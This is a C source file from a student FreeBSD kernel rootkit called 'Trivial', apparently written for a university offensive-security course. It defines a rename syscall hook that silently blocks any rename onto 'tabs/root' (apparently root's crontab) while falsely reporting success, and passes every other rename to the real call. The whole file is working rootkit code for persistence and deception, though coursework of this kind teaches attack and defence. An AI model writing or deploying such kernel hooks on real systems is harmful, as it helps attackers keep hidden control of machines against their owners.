/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * rename syscall hook
 *
 */

#include "trivial.h"

int
rename_hook(struct thread *td, void *syscall_args) 
{
	struct rename_args /* {
		char *from;
		char *to;
	} */ *uap;
	uap = (struct rename_args *)syscall_args;

	/* Ensure it's not renaming something to tabs/root */
	char kto[PATH_MAX];
	size_t len = 0;
	copyinstr(uap->to, &kto, PATH_MAX, &len);

	if (strncmp(kto, "tabs/root", len) == 0) {
		return 0; // pretend to succeed
	}

	/* Perform the syscall */
	int error = rename(td, syscall_args);

	return (error);
}
